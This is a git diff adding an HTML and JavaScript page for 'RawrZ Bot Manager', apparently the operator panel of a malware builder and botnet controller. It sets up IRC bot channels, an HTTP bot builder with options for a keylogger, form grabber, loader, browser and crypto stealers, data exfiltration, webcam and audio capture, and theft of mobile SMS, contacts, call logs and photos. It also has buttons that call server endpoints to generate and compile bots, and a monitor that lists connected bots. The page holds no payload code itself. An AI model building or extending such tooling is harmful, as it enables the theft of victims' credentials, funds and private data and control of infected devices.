@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ Bot Manager - Embedded mIRC & HTTP Bot Control</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #0c0f1a 0%, #1a1f2e 100%);
+            color: #e6e9ef; 
+            min-height: 100vh;
+        }
+        .header { 
+            background: linear-gradient(90deg, #1a1f2e 0%, #2d3748 100%);
+            padding: 1rem 2rem; 
+            border-bottom: 2px solid #4a5568;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        .header h1 { 
+            color: #68d391; 
+            font-size: 1.8rem; 
+            font-weight: 600;
+            text-shadow: 0 0 10px rgba(104, 211, 145, 0.3);
+        }
+        .header .subtitle { 
+            color: #a0aec0; 
+            font-size: 0.9rem; 
+            margin-top: 0.25rem;
+        }
+        .container { 
+            max-width: 1600px; 
+            margin: 0 auto; 
+            padding: 2rem; 
+        }
+        .grid { 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 1.5rem; 
+            margin-bottom: 2rem;
+        }
+        .full-width { 
+            grid-column: 1 / -1; 
+        }
+        .card { 
+            background: linear-gradient(145deg, #1a202c 0%, #2d3748 100%);
+            border: 1px solid #4a5568; 
+            border-radius: 12px; 
+            padding: 1.5rem; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover { 
+            transform: translateY(-2px); 
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+        .card h3 { 
+            color: #68d391; 
+            margin-bottom: 1rem; 
+            font-size: 1.1rem;
+            border-bottom: 1px solid #4a5568;
+            padding-bottom: 0.5rem;
+        }
+        .form-group { 
+            margin-bottom: 1rem; 
+        }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 0.5rem; 
+            color: #cbd5e0; 
+            font-weight: 500;
+        }
+        input, select, textarea, button { 
+            width: 100%; 
+            padding: 0.75rem; 
+            border: 1px solid #4a5568; 
+            border-radius: 8px; 
+            background: #2d3748; 
+            color: #e6e9ef; 
+            font-size: 0.9rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        input:focus, select:focus, textarea:focus { 
+            outline: none; 
+            border-color: #68d391; 
+            box-shadow: 0 0 0 3px rgba(104, 211, 145, 0.1);
+        }
+        button { 
+            background: linear-gradient(135deg, #68d391 0%, #48bb78 100%);
+            border: none; 
+            color: #1a202c; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.2s;
+            margin-top: 0.5rem;
+        }
+        button:hover { 
+            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(104, 211, 145, 0.3);
+        }
+        button:disabled { 
+            background: #4a5568; 
+            cursor: not-allowed; 
+            transform: none;
+        }
+        .checkbox-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 0.5rem;
+            margin-top: 0.5rem;
+        }
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .checkbox-item input[type="checkbox"] {
+            width: auto;
+            margin: 0;
+        }
+        .output { 
+            background: #0c0f1a; 
+            border: 1px solid #2d3748; 
+            border-radius: 8px; 
+            padding: 1rem; 
+            margin-top: 1rem; 
+            max-height: 400px; 
+            overflow-y: auto; 
+            font-family: 'Courier New', monospace; 
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .status { 
+            padding: 0.5rem 1rem; 
+            border-radius: 6px; 
+            margin: 0.5rem 0; 
+            font-weight: 500;
+        }
+        .status.success { background: rgba(104, 211, 145, 0.2); color: #68d391; border: 1px solid #68d391; }
+        .status.error { background: rgba(245, 101, 101, 0.2); color: #f56565; border: 1px solid #f56565; }
+        .status.info { background: rgba(66, 153, 225, 0.2); color: #4299e1; border: 1px solid #4299e1; }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #4a5568;
+            border-radius: 50%;
+            border-top-color: #68d391;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 1rem;
+            color: #68d391;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .back-link:hover {
+            color: #48bb78;
+        }
+        .mirc-container {
+            background: #000;
+            border: 2px solid #4a5568;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            height: 400px;
+            overflow-y: auto;
+        }
+        .mirc-line {
+            margin-bottom: 0.25rem;
+        }
+        .mirc-timestamp {
+            color: #68d391;
+        }
+        .mirc-user {
+            color: #4299e1;
+        }
+        .mirc-message {
+            color: #e6e9ef;
+        }
+        .mirc-system {
+            color: #f56565;
+        }
+        .bot-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .bot-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem;
+            border: 1px solid #4a5568;
+            border-radius: 6px;
+            margin-bottom: 0.5rem;
+            background: #2d3748;
+        }
+        .bot-status {
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        .bot-status.online {
+            background: rgba(104, 211, 145, 0.2);
+            color: #68d391;
+        }
+        .bot-status.offline {
+            background: rgba(245, 101, 101, 0.2);
+            color: #f56565;
+        }
+        .tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+        .tab {
+            padding: 0.5rem 1rem;
+            background: #2d3748;
+            border: 1px solid #4a5568;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .tab.active {
+            background: #68d391;
+            color: #1a202c;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>RawrZ Bot Manager</h1>
+        <div class="subtitle">Embedded mIRC Client & HTTP Bot Control Center</div>
+    </div>
+
+    <div class="container">
+        <a href="/panel" class="back-link">← Back to Main Panel</a>
+
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('mirc', this)">Embedded mIRC</div>
+            <div class="tab" onclick="showTab('http-bot', this)">HTTP Bot Builder</div>
+            <div class="tab" onclick="showTab('bot-monitor', this)">Bot Monitor</div>
+            <div class="tab" onclick="showTab('connections', this)">Connections</div>
+        </div>
+
+        <!-- Embedded mIRC Tab -->
+        <div id="mirc" class="tab-content active">
+            <div class="grid">
+                <div class="card">
+                    <h3>Embedded mIRC Client</h3>
+                    <div class="form-group">
+                        <label>IRC Server</label>
+                        <input type="text" id="mircServer" placeholder="irc.rizon.net" value="irc.rizon.net">
+                    </div>
+                    <div class="form-group">
+                        <label>Port</label>
+                        <input type="number" id="mircPort" placeholder="6667" value="6667">
+                    </div>
+                    <div class="form-group">
+                        <label>Nickname</label>
+                        <input type="text" id="mircNick" placeholder="RawrZBot" value="RawrZBot">
+                    </div>
+                    <div class="form-group">
+                        <label>Channels</label>
+                        <input type="text" id="mircChannels" placeholder="#rawrz,#bots" value="#rawrz,#bots">
+                    </div>
+                    <div class="form-group">
+                        <button onclick="connectToIRC()">Connect to IRC</button>
+                        <button onclick="disconnectFromIRC()" style="background: linear-gradient(135deg, #f56565 0%, #e53e3e 100%);">Disconnect</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>IRC Status</h3>
+                    <div id="ircStatus" class="status info">Disconnected</div>
+                    <div class="form-group">
+                        <label>Send Message</label>
+                        <input type="text" id="ircMessage" placeholder="Type message here...">
+                        <button onclick="sendIRCMessage()">Send</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card full-width">
+                <h3>IRC Chat Log</h3>
+                <div id="mircChat" class="mirc-container">
+                    <div class="mirc-line">
+                        <span class="mirc-timestamp">[00:00:00]</span>
+                        <span class="mirc-system">*** RawrZ mIRC Client Ready</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- HTTP Bot Builder Tab -->
+        <div id="http-bot" class="tab-content">
+            <div class="grid">
+                <div class="card">
+                    <h3>HTTP Bot Configuration</h3>
+                    <div class="form-group">
+                        <label>Bot Name</label>
+                        <input type="text" id="httpBotName" placeholder="HTTPBot" value="HTTPBot">
+                    </div>
+                    <div class="form-group">
+                        <label>Server URL</label>
+                        <input type="text" id="httpServerUrl" placeholder="http://localhost:8080" value="http://localhost:8080">
+                    </div>
+                    <div class="form-group">
+                        <label>Programming Language</label>
+                        <select id="httpBotLanguage">
+                            <option value="cpp">C++</option>
+                            <option value="python">Python</option>
+                            <option value="javascript">JavaScript</option>
+                            <option value="go">Go</option>
+                            <option value="rust">Rust</option>
+                            <option value="csharp">C#</option>
+                            <option value="swift">Swift (iOS)</option>
+                            <option value="kotlin">Kotlin (Android)</option>
+                            <option value="java">Java (Cross-platform)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Bot Features</h3>
+                    <div class="checkbox-group">
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureFileManager" checked>
+                            <label for="httpFeatureFileManager">File Manager</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureProcessManager" checked>
+                            <label for="httpFeatureProcessManager">Process Manager</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureSystemInfo" checked>
+                            <label for="httpFeatureSystemInfo">System Info</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureNetworkTools" checked>
+                            <label for="httpFeatureNetworkTools">Network Tools</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureKeylogger">
+                            <label for="httpFeatureKeylogger">Keylogger</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureScreenCapture">
+                            <label for="httpFeatureScreenCapture">Screen Capture</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureFormGrabber">
+                            <label for="httpFeatureFormGrabber">Form Grabber</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureLoader">
+                            <label for="httpFeatureLoader">Loader</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureWebcamCapture">
+                            <label for="httpFeatureWebcamCapture">Webcam Capture</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureAudioCapture">
+                            <label for="httpFeatureAudioCapture">Audio Capture</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureBrowserStealer">
+                            <label for="httpFeatureBrowserStealer">Browser Stealer</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureCryptoStealer">
+                            <label for="httpFeatureCryptoStealer">Crypto Stealer</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureHttpComm" checked>
+                            <label for="httpFeatureHttpComm">HTTP Communication</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureWebInterface">
+                            <label for="httpFeatureWebInterface">Web Interface</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureApiEndpoint">
+                            <label for="httpFeatureApiEndpoint">API Endpoint</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureDataExfiltration">
+                            <label for="httpFeatureDataExfiltration">Data Exfiltration</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileLocation">
+                            <label for="httpFeatureMobileLocation">Mobile Location</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileContacts">
+                            <label for="httpFeatureMobileContacts">Mobile Contacts</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileSMS">
+                            <label for="httpFeatureMobileSMS">Mobile SMS</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileCallLog">
+                            <label for="httpFeatureMobileCallLog">Mobile Call Log</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobilePhotos">
+                            <label for="httpFeatureMobilePhotos">Mobile Photos</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileVideos">
+                            <label for="httpFeatureMobileVideos">Mobile Videos</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileApps">
+                            <label for="httpFeatureMobileApps">Mobile Apps</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileDeviceInfo">
+                            <label for="httpFeatureMobileDeviceInfo">Mobile Device Info</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileNetworkInfo">
+                            <label for="httpFeatureMobileNetworkInfo">Mobile Network Info</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileBatteryInfo">
+                            <label for="httpFeatureMobileBatteryInfo">Mobile Battery Info</label>
+                        </div>
+                        <div class="checkbox-item">
+                            <input type="checkbox" id="httpFeatureMobileStorageInfo">
+                            <label for="httpFeatureMobileStorageInfo">Mobile Storage Info</label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card full-width">
+                <h3>HTTP Bot Actions</h3>
+                <div class="form-group">
+                    <button onclick="generateHTTPBot()">Generate HTTP Bot</button>
+                    <button onclick="testHTTPBot()">Test HTTP Bot</button>
+                    <button onclick="compileHTTPBot()">Compile HTTP Bot</button>
+                    <button onclick="getHTTPBotTemplates()">Load Templates</button>
+                    <button onclick="getHTTPBotFeatures()">Get Features</button>
+                </div>
+                <div id="httpBotOutput" class="output">Ready to generate HTTP bots...</div>
+            </div>
+        </div>
+
+        <!-- Bot Monitor Tab -->
+        <div id="bot-monitor" class="tab-content">
+            <div class="grid">
+                <div class="card">
+                    <h3>Active Bots</h3>
+                    <div id="botList" class="bot-list">
+                        <div class="bot-item">
+                            <div>
+                                <strong>No bots connected</strong>
+                                <br><small>Bots will appear here when they connect</small>
+                            </div>
+                            <div class="bot-status offline">Offline</div>
+                        </div>
+                    </div>
+                    <button onclick="refreshBotList()">Refresh Bot List</button>
+                </div>
+
+                <div class="card">
+                    <h3>Bot Statistics</h3>
+                    <div id="botStats">
+                        <p><strong>Total Bots:</strong> <span id="totalBots">0</span></p>
+                        <p><strong>Active Bots:</strong> <span id="activeBots">0</span></p>
+                        <p><strong>IRC Bots:</strong> <span id="ircBots">0</span></p>
+                        <p><strong>HTTP Bots:</strong> <span id="httpBots">0</span></p>
+                    </div>
+                    <button onclick="getBotStatus()">Update Statistics</button>
+                </div>
+            </div>
+
+            <div class="card full-width">
+                <h3>Bot Communication Log</h3>
+                <div id="botCommLog" class="output">Bot communication log will appear here...</div>
+            </div>
+        </div>
+
+        <!-- Connections Tab -->
+        <div id="connections" class="tab-content">
+            <div class="card full-width">
+                <h3>Connection Management</h3>
+                <div class="grid">
+                    <div class="card">
+                        <h3>IRC Connections</h3>
+                        <div id="ircConnections">
+                            <p>No IRC connections active</p>
+                        </div>
+                        <button onclick="refreshIRCConnections()">Refresh IRC</button>
+                    </div>
+
+                    <div class="card">
+                        <h3>HTTP Bot Connections</h3>
+                        <div id="httpConnections">
+                            <p>No HTTP bot connections active</p>
+                        </div>
+                        <button onclick="refreshHTTPConnections()">Refresh HTTP</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let ircConnected = false;
+        let botConnections = new Map();
+        let botHeartbeats = new Map();
+
+        // API helper function
+        async function api(endpoint, method = 'GET', data = null) {
+            const options = {
+                method,
+                headers: {
+                    'Content-Type': 'application/json',
+                }
+            };
+            
+            if (data) {
+                options.body = JSON.stringify(data);
+            }
+            
+            const response = await fetch(endpoint, options);
+            const result = await response.json();
+            
+            return {
+                status: response.status,
+                data: result
+            };
+        }
+
+        // Show loading state
+        function showLoading(button) {
+            const originalText = button.textContent;
+            button.disabled = true;
+            button.innerHTML = '<span class="loading"></span> Loading...';
+            
+            return () => {
+                button.disabled = false;
+                button.textContent = originalText;
+            };
+        }
+
+        // Show status message
+        function showStatus(message, type = 'info', container = 'output') {
+            const statusDiv = document.createElement('div');
+            statusDiv.className = `status ${type}`;
+            statusDiv.textContent = message;
+            
+            const output = document.getElementById(container);
+            output.appendChild(statusDiv);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // Show output
+        function showOutput(data, container = 'output') {
+            const output = document.getElementById(container);
+            const pre = document.createElement('pre');
+            pre.textContent = JSON.stringify(data, null, 2);
+            output.appendChild(pre);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // Tab switching
+        function showTab(tabName, button) {
+            // Hide all tab contents
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected tab content
+            document.getElementById(tabName).classList.add('active');
+            button.classList.add('active');
+        }
+
+        // IRC Functions
+        function connectToIRC() {
+            const server = document.getElementById('mircServer').value;
+            const port = document.getElementById('mircPort').value;
+            const nick = document.getElementById('mircNick').value;
+            const channels = document.getElementById('mircChannels').value;
+            
+            addToMIRCLog(`*** Connecting to ${server}:${port} as ${nick}`);
+            addToMIRCLog(`*** Joining channels: ${channels}`);
+            
+            ircConnected = true;
+            document.getElementById('ircStatus').textContent = 'Connected';
+            document.getElementById('ircStatus').className = 'status success';
+            
+            // Simulate IRC connection
+            setTimeout(() => {
+                addToMIRCLog(`*** Connected to ${server}`);
+                addToMIRCLog(`*** Joining ${channels.split(',')[0]}`);
+                addToMIRCLog(`*** Joined ${channels.split(',')[0]}`);
+            }, 1000);
+        }
+
+        function disconnectFromIRC() {
+            addToMIRCLog('*** Disconnecting from IRC');
+            ircConnected = false;
+            document.getElementById('ircStatus').textContent = 'Disconnected';
+            document.getElementById('ircStatus').className = 'status info';
+        }
+
+        function sendIRCMessage() {
+            const message = document.getElementById('ircMessage').value;
+            if (message && ircConnected) {
+                addToMIRCLog(`<${document.getElementById('mircNick').value}> ${message}`);
+                document.getElementById('ircMessage').value = '';
+            }
+        }
+
+        function addToMIRCLog(message) {
+            const chat = document.getElementById('mircChat');
+            const line = document.createElement('div');
+            line.className = 'mirc-line';
+            
+            const timestamp = new Date().toLocaleTimeString();
+            line.innerHTML = `<span class="mirc-timestamp">[${timestamp}]</span> ${message}`;
+            
+            chat.appendChild(line);
+            chat.scrollTop = chat.scrollHeight;
+        }
+
+        // HTTP Bot Functions
+        function getSelectedHTTPFeatures() {
+            const features = [];
+            const checkboxes = document.querySelectorAll('#http-bot input[type="checkbox"]:checked');
+            checkboxes.forEach(checkbox => {
+                const featureName = checkbox.id.replace('httpFeature', '');
+                const featureMap = {
+                    'FileManager': 'fileManager',
+                    'ProcessManager': 'processManager',
+                    'SystemInfo': 'systemInfo',
+                    'NetworkTools': 'networkTools',
+                    'Keylogger': 'keylogger',
+                    'ScreenCapture': 'screenCapture',
+                    'FormGrabber': 'formGrabber',
+                    'Loader': 'loader',
+                    'WebcamCapture': 'webcamCapture',
+                    'AudioCapture': 'audioCapture',
+                    'BrowserStealer': 'browserStealer',
+                    'CryptoStealer': 'cryptoStealer',
+                    'HttpComm': 'httpComm',
+                    'WebInterface': 'webInterface',
+                    'ApiEndpoint': 'apiEndpoint',
+                    'DataExfiltration': 'dataExfiltration',
+                    'MobileLocation': 'mobileLocation',
+                    'MobileContacts': 'mobileContacts',
+                    'MobileSMS': 'mobileSMS',
+                    'MobileCallLog': 'mobileCallLog',
+                    'MobilePhotos': 'mobilePhotos',
+                    'MobileVideos': 'mobileVideos',
+                    'MobileApps': 'mobileApps',
+                    'MobileDeviceInfo': 'mobileDeviceInfo',
+                    'MobileNetworkInfo': 'mobileNetworkInfo',
+                    'MobileBatteryInfo': 'mobileBatteryInfo',
+                    'MobileStorageInfo': 'mobileStorageInfo'
+                };
+                features.push(featureMap[featureName] || featureName.toLowerCase());
+            });
+            return features;
+        }
+
+        async function generateHTTPBot() {
+            const button = event.target;
+            const stopLoading = showLoading(button);
+            
+            try {
+                const config = {
+                    name: document.getElementById('httpBotName').value,
+                    server: document.getElementById('httpServerUrl').value
+                };
+                
+                const features = getSelectedHTTPFeatures();
+                const language = document.getElementById('httpBotLanguage').value;
+                
+                showStatus('Generating HTTP bot...', 'info', 'httpBotOutput');
+                
+                const result = await api('/http-bot/generate', 'POST', {
+                    config,
+                    features,
+                    extensions: [language]
+                });
+                
+                stopLoading();
+                
+                if (result.status === 200) {
+                    showStatus('HTTP bot generated successfully!', 'success', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                } else {
+                    showStatus('HTTP bot generation failed', 'error', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                }
+            } catch (error) {
+                stopLoading();
+                showStatus(`Error: ${error.message}`, 'error', 'httpBotOutput');
+            }
+        }
+
+        async function testHTTPBot() {
+            const button = event.target;
+            const stopLoading = showLoading(button);
+            
+            try {
+                const config = {
+                    name: document.getElementById('httpBotName').value,
+                    server: document.getElementById('httpServerUrl').value
+                };
+                
+                showStatus('Testing HTTP bot...', 'info', 'httpBotOutput');
+                
+                const result = await api('/http-bot/test', 'POST', { config });
+                
+                stopLoading();
+                
+                if (result.status === 200) {
+                    showStatus('HTTP bot test completed!', 'success', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                } else {
+                    showStatus('HTTP bot test failed', 'error', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                }
+            } catch (error) {
+                stopLoading();
+                showStatus(`Error: ${error.message}`, 'error', 'httpBotOutput');
+            }
+        }
+
+        async function compileHTTPBot() {
+            const button = event.target;
+            const stopLoading = showLoading(button);
+            
+            try {
+                const language = document.getElementById('httpBotLanguage').value;
+                const config = {
+                    name: document.getElementById('httpBotName').value,
+                    server: document.getElementById('httpServerUrl').value
+                };
+                
+                // Generate code first
+                const features = getSelectedHTTPFeatures();
+                const generateResult = await api('/http-bot/generate', 'POST', {
+                    config,
+                    features,
+                    extensions: [language]
+                });
+                
+                if (generateResult.status !== 200) {
+                    throw new Error('Failed to generate bot code');
+                }
+                
+                const botCode = generateResult.data.result.bots[language].code;
+                
+                showStatus('Compiling HTTP bot...', 'info', 'httpBotOutput');
+                
+                const result = await api('/http-bot/compile', 'POST', {
+                    code: botCode,
+                    language,
+                    config
+                });
+                
+                stopLoading();
+                
+                if (result.status === 200) {
+                    showStatus('HTTP bot compiled successfully!', 'success', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                } else {
+                    showStatus('HTTP bot compilation failed', 'error', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                }
+            } catch (error) {
+                stopLoading();
+                showStatus(`Error: ${error.message}`, 'error', 'httpBotOutput');
+            }
+        }
+
+        async function getHTTPBotTemplates() {
+            const button = event.target;
+            const stopLoading = showLoading(button);
+            
+            try {
+                showStatus('Loading HTTP bot templates...', 'info', 'httpBotOutput');
+                
+                const result = await api('/http-bot/templates', 'GET');
+                
+                stopLoading();
+                
+                if (result.status === 200) {
+                    showStatus('HTTP bot templates loaded!', 'success', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                } else {
+                    showStatus('Failed to load templates', 'error', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                }
+            } catch (error) {
+                stopLoading();
+                showStatus(`Error: ${error.message}`, 'error', 'httpBotOutput');
+            }
+        }
+
+        async function getHTTPBotFeatures() {
+            const button = event.target;
+            const stopLoading = showLoading(button);
+            
+            try {
+                showStatus('Loading HTTP bot features...', 'info', 'httpBotOutput');
+                
+                const result = await api('/http-bot/features', 'GET');
+                
+                stopLoading();
+                
+                if (result.status === 200) {
+                    showStatus('HTTP bot features loaded!', 'success', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                } else {
+                    showStatus('Failed to load features', 'error', 'httpBotOutput');
+                    showOutput(result.data, 'httpBotOutput');
+                }
+            } catch (error) {
+                stopLoading();
+                showStatus(`Error: ${error.message}`, 'error', 'httpBotOutput');
+            }
+        }
+
+        // Bot Monitoring Functions
+        async function refreshBotList() {
+            try {
+                const result = await api('/bot/status', 'GET');
+                
+                if (result.status === 200) {
+                    updateBotList(result.data);
+                }
+            } catch (error) {
+                console.error('Failed to refresh bot list:', error);
+            }
+        }
+
+        function updateBotList(data) {
+            const botList = document.getElementById('botList');
+            botList.innerHTML = '';
+            
+            if (data.bots && data.bots.length > 0) {
+                data.bots.forEach(bot => {
+                    const botItem = document.createElement('div');
+                    botItem.className = 'bot-item';
+                    botItem.innerHTML = `
+                        <div>
+                            <strong>${bot.name || bot.id}</strong>
+                            <br><small>ID: ${bot.id} | Type: ${bot.type || 'Unknown'}</small>
+                        </div>
+                        <div class="bot-status ${bot.status === 'online' ? 'online' : 'offline'}">
+                            ${bot.status || 'Unknown'}
+                        </div>
+                    `;
+                    botList.appendChild(botItem);
+                });
+            } else {
+                botList.innerHTML = `
+                    <div class="bot-item">
+                        <div>
+                            <strong>No bots connected</strong>
+                            <br><small>Bots will appear here when they connect</small>
+                        </div>
+                        <div class="bot-status offline">Offline</div>
+                    </div>
+                `;
+            }
+        }
+
+        async function getBotStatus() {
+            try {
+                const result = await api('/bot/status', 'GET');
+                
+                if (result.status === 200) {
+                    document.getElementById('totalBots').textContent = result.data.total || 0;
+                    document.getElementById('activeBots').textContent = result.data.active || 0;
+                    document.getElementById('ircBots').textContent = result.data.irc || 0;
+                    document.getElementById('httpBots').textContent = result.data.http || 0;
+                }
+            } catch (error) {
+                console.error('Failed to get bot status:', error);
+            }
+        }
+
+        function refreshIRCConnections() {
+            document.getElementById('ircConnections').innerHTML = `
+                <p>IRC Server: ${document.getElementById('mircServer').value}</p>
+                <p>Status: ${ircConnected ? 'Connected' : 'Disconnected'}</p>
+                <p>Nickname: ${document.getElementById('mircNick').value}</p>
+            `;
+        }
+
+        function refreshHTTPConnections() {
+            document.getElementById('httpConnections').innerHTML = `
+                <p>HTTP Server: ${document.getElementById('httpServerUrl').value}</p>
+                <p>Active Connections: ${botConnections.size}</p>
+                <p>Last Heartbeat: ${new Date().toLocaleTimeString()}</p>
+            `;
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            showStatus('Bot Manager initialized!', 'success', 'httpBotOutput');
+            showStatus('Bot Manager initialized!', 'success', 'botCommLog');
+            
+            // Start periodic updates
+            setInterval(refreshBotList, 5000);
+            setInterval(getBotStatus, 10000);
+            
+            // Add Enter key support for IRC messages
+            document.getElementById('ircMessage').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    sendIRCMessage();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
